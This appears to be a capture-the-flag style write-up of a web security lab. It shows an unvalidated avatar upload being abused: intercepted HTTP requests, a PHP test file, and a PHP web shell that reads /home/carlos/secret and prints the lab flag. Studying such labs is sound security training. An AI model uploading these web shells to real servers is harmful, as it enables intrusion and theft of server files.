# Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

## 1. Detection

- Opened the Lab URL and clicked on <a href="/my-account?id=wiener">My Account</a> and logged in with given credentials `wiener:peter`.
- The page had option to upload an avatar.
- I uploaded a normal image file and captured the request in <a href="https://portswigger.net/burp/downloads">BurpSuite</a>.
- A `POST /my-account/avatar` was being sent, I right clicked on the request and sent it to `Repeater` tab to start playing with it.
```http
POST /my-account/avatar HTTP/2
Host: <REDACTED_HOST>
Cookie: session=<REDACTED_SESSION>
Content-Length: 529
Cache-Control: max-age=0
Sec-Ch-Ua: <REDACTED>
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: <REDACTED>
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryotTPzPfnxBJhA76G
User-Agent: <REDACTED>
Origin: <REDACTED_ORIGIN>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: <REDACTED_REFERER>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="test.txt"
Content-Type: text/plain

test
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="csrf"

<REDACTED_CSRF_TOKEN>
------WebKitFormBoundaryotTPzPfnxBJhA76G--
```
- I changed the file extention to a non-image file that is `.txt` file, changed the content-type to `text/plain` and sent the request, the application accepted it and gave me the exact path to the file in response.
```http
HTTP/2 200 OK
Date: <REDACTED_DATE>
Server: <REDACTED_SERVER>
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/test.txt has been uploaded.
<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
- This means the web-server isn't checking extension, content-type, which makes me thing of uploading a code on the server.

---

# 2. Code Execution
- I changed the content-type from `text/plain` to `text/html` and file name from `test.txt` to `test.php` and a harmless php code to display `2` and forwarded the request.
```http
------WebKitFormBoundaryotTPzPfnxBJhA76G
POST /my-account/avatar HTTP/2
Host: <REDACTED_HOST>
Cookie: session=<REDACTED_SESSION>
Content-Length: 529
Cache-Control: max-age=0
Sec-Ch-Ua: <REDACTED>
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: <REDACTED>
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryotTPzPfnxBJhA76G
User-Agent: <REDACTED>
Origin: <REDACTED_ORIGIN>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: <REDACTED_REFERER>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/plain

<?php
    echo 1+1;
?>
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="csrf"

<REDACTED_CSRF_TOKEN>
------WebKitFormBoundaryotTPzPfnxBJhA76G--
```
- Got the following response from the server :
```http
HTTP/2 200 OK
Date: <REDACTED_DATE>
Server: <REDACTED_SERVER>
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/test.php has been uploaded.
<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
- I visited `/avatars/test.php` and the web-server displayed `2`, that means my code got executed on the server.

---

# 3. Solve the Challenge
- The challenge was to print the content of the `/home/carlos/secret` file which contains a secret and submit the same.
- I simply modified the code from
```php
<?php
    echo 1+1;
?>
```
to
```php
<?php
    $flag_path='/home/carlos/secret';
	$content=file_get_contents($flag_path);
    echo $content;
?>
```
- Forwarded the request again and the code was uploaded on the server.
- Simple refreshed the `/avatars/test.php` and got the flag:-
`M6VFmawlo8efyG7D2lCRDGlRl5iD2uSm`.
- Submitted the same and solved the challenge.
